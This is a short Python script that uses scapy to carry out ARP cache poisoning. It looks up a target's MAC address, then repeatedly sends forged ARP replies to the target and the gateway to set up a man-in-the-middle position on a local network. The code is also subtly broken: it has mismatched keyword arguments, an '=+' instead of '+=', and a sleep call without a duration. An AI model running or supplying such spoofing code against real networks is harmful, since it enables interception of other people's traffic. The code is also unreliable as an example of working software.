import time
import sys
import scapy.all as scapy

class ARP:
    def __init__(self, target, mime):
        self.target = target
        self.mime = mime
        
    def get_mac(self, ip_addr):
        arp_req = scapy.ARP(pdst=ip_addr)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast = broadcast / arp_req
        response = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]
        return response[0][1].hwsrc
    
    def init_poison(self, target, mime):
        packet = scapy.ARP(op=2, pdst=target, hwdst=self.get_mac(target), psrc=mime)
        scapy.send(packet, verbose=False)
    
    def init_monitor(self, target, gateway):
        sent_count = 0
        while True:
            sent_count =+ 2
            self.init_poison(target=target, gateway=gateway)
            self.init_poison(gateway=gateway, target=target)    
            time.sleep()